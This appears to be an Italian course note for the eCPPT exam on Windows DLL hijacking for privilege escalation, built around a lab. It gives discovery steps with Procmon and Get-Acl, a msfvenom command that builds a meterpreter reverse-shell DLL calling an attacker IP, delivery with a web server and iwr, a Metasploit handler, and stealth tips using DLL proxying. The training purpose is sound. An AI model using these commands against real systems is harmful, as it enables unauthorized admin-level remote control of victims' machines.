# 013 — DLL Hijacking (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 13/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [013_DLL Hijacking.txt](013_DLL Hijacking.txt) · [013_DLL Hijacking.srt](013_DLL Hijacking.srt)

## Concetti chiave

- **DLL Hijacking**: l'attaccante piazza una **DLL malevola con lo stesso nome** di una DLL che un programma cerca seguendo il **DLL search order** di Windows.
- Quando il programma parte (eseguito da un utente più privilegiato), carica la DLL malevola → il codice gira con i privilegi di quel processo.
- **Due prerequisiti**:
  1. Esiste un programma privilegiato che cerca una DLL **mancante** in una directory writable.
  2. Il nostro utente low-priv ha **write permission** su quella directory.
- Tool chiave per il discovery: **Procmon64** (Sysinternals) → filtro `Operation = CreateFile` + `Result = NAME NOT FOUND`.
- Risultato lab: `DVTA.exe` (su Desktop\Administrator) chiama `dwrite.dll` ma non la trova; lo `student` ha FullControl sulla cartella `DVTA\bin\Release` → drop di DLL meterpreter → quando l'admin lancia DVTA → meterpreter come admin.

## Spiegazione approfondita

### DLL Search Order (default — SafeDllSearchMode abilitato)

1. **Directory dell'applicazione** (dove gira l'eseguibile).
2. **System directory** (`C:\Windows\System32`).
3. **16-bit system directory** (`C:\Windows\System`).
4. **Windows directory** (`C:\Windows`).
5. **Current directory**.
6. Directory listate nella variabile **`PATH`**.

Se trovi una DLL writable in una qualsiasi di queste posizioni cercata da un processo privilegiato → potenziale hijack.

### Varianti

| Variante | Cosa fa |
|---|---|
| **Search Order Hijacking** | Sfrutta l'ordine: DLL piazzata in dir precedente a quella della DLL legittima |
| **DLL Side-Loading** | App firmata Microsoft + manifest specifica DLL non firmata accanto → drop side-by-side |
| **Phantom DLL Loading** | App cerca una DLL che **non esiste** sul sistema → crei tu il "fantasma" (caso del lab) |
| **DLL Replacement** | Sovrascrivi una DLL legittima (richiede write sull'originale) |
| **DLL Proxying** | La DLL malevola **forwarda** chiamate a quella vera → app funziona normalmente, nessun crash |

### Metodologia (3 step)

1. **Identifica programma vulnerabile**:
   - Programmi che girano come admin/SYSTEM (services, scheduled task, autorun, programmi avviati da utenti privilegiati).
2. **Analizza dipendenze DLL con Procmon**:
   - Filtri: `Process Name = target.exe`, `Operation = CreateFile`, `Result = NAME NOT FOUND`.
   - Cerca DLL non-Windows (custom) che il programma tenta di caricare ma non trova.
3. **Verifica permessi e drop**:
   - `Get-Acl` sulla cartella di destinazione → conferma write.
   - `msfvenom -f dll` con il nome esatto della DLL mancante → drop nella cartella → trigger.

### Workflow lab

1. Su target (RDP come admin): apri `Procmon64.exe` → escludi Registry/Network → filtro `Operation = CreateFile`.
2. Lancia `DVTA.exe` → vedi tutta l'attività.
3. Aggiungi filtri: `Process Name = DVTA.exe`, `Result = NAME NOT FOUND`.
4. Vedi che cerca `dwrite.dll` in `C:\Users\Administrator\Desktop\DVTA\bin\Release\` → NOT FOUND.
5. Su attacker (PowerShell come student): `Get-Acl "C:\Users\Administrator\Desktop\DVTA\bin\Release" | Format-List` → `student : FullControl` (verifica essenziale).
6. Su Kali: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI> LPORT=4444 -f dll -o dwrite.dll`.
7. Web server: `python -m SimpleHTTPServer 80`.
8. Handler msf: `multi/handler` + payload reverse_tcp + LHOST/LPORT.
9. Su attacker (student): scarica DLL con `iwr -UseBasicParsing` → copia in `DVTA\bin\Release\`.
10. Simulazione: admin avvia `DVTA.exe` → DLL caricata → meterpreter come admin.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `Procmon64.exe` | Monitor real-time syscall/file/registry — discovery DLL mancanti |
| Filtro Procmon: `Operation is CreateFile` + `Result is NAME NOT FOUND` + `Process Name is <target>.exe` | Trova candidati hijack |
| `Get-Acl <path> \| Format-List` | Verifica write permission sul folder |
| `icacls <path>` | Equivalente CLI per ACL |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=.. LPORT=4444 -f dll -o <nome_esatto>.dll` | Generazione DLL malevola |
| `iwr -UseBasicParsing -Uri http://<KALI>/<dll> -OutFile <dll>` | Download su target |
| `copy <dll> "C:\path\to\target\folder\"` | Drop nella cartella vulnerabile |
| `use exploit/multi/handler` | Listener meterpreter |
| **PowerUp** `Find-PathDLLHijack`, `Find-ProcessDLLHijack` | Discovery automatico DLL hijack (alternativa) |

## Esempi pratici

```text
# 1. Procmon discovery (GUI)
Filter:
  Process Name  is  DVTA.exe
  Operation     is  CreateFile
  Result        is  NAME NOT FOUND
Risultato: C:\Users\Administrator\Desktop\DVTA\bin\Release\dwrite.dll  NOT FOUND
```

```powershell
# 2. Check permessi (come student)
Get-Acl "C:\Users\Administrator\Desktop\DVTA\bin\Release" | Format-List
# Cerca: TARGET\student  Allow  FullControl
```

```bash
# 3. Generazione DLL + delivery + handler (Kali)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.43 LPORT=4444 -f dll -o dwrite.dll
python -m SimpleHTTPServer 80

msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.43
set LPORT 4444
exploit
```

```powershell
# 4. Drop su target (come student)
cd C:\Users\student\Desktop
iwr -UseBasicParsing -Uri "http://10.10.10.43/dwrite.dll" -OutFile "dwrite.dll"
Copy-Item dwrite.dll "C:\Users\Administrator\Desktop\DVTA\bin\Release\"

# 5. Trigger: admin lancia DVTA.exe → meterpreter come Administrator
```

## Punti d'attenzione per l'esame eCPPT

- **Tre prerequisiti chiave**:
  1. Processo target lanciato con **alti privilegi**.
  2. DLL **mancante** o **sovrascrivibile** nel search path.
  3. **Write permission** del nostro utente sulla folder coinvolta.
- **Nome DLL esatto**: `msfvenom -o dwrite.dll` deve matchare ESATTAMENTE il nome cercato (case sensitive in nome anche su Windows logico).
- **Phantom DLL** (NAME NOT FOUND) è il caso più semplice — nessuna DLL legittima da rispettare → niente proxy needed.
- **Search order**: memorizza i primi 4 posti (app dir, System32, System, Windows). L'app dir è la prima → se writable, vinci.
- **Privilegi del payload = privilegi del processo che carica la DLL**. Service SYSTEM → SYSTEM. Admin che apre app → admin.
- **Procmon filters obbligatori per non annegare**: `CreateFile` + `NAME NOT FOUND` + nome processo.
- **PowerUp** automatizza il discovery: `Find-ProcessDLLHijack`, `Find-PathDLLHijack` (cerca dir scrivibili nel PATH).
- **DLL Hijacking è alla base di molti UACMe methods** (es. method 23 → `pkgmgr.exe`). Collegamento diretto col video 12.
- **OPSEC**: se la DLL malevola fa crash dopo il payload, il programma muore visibilmente → usare un loader che ritorna controllo (DLL proxying) per essere stealth.

## Collegamenti con altri video

- Precedente: [[012_Bypassing UAC with UACMe]] — molti UAC bypass = DLL hijack.
- Prossimo: [[014_Locally Stored Credentials]] (inizio sezione Linux).
- Discovery automatico: [[03_Privilege Escalation with PowerUp]] (`Find-*DLLHijack`).
- Service exe hijack (concetto cugino): [[08_Exploiting Insecure Service Permissions]].
- MITRE ATT&CK: T1574.001 (DLL Search Order Hijacking), T1574.002 (DLL Side-Loading).
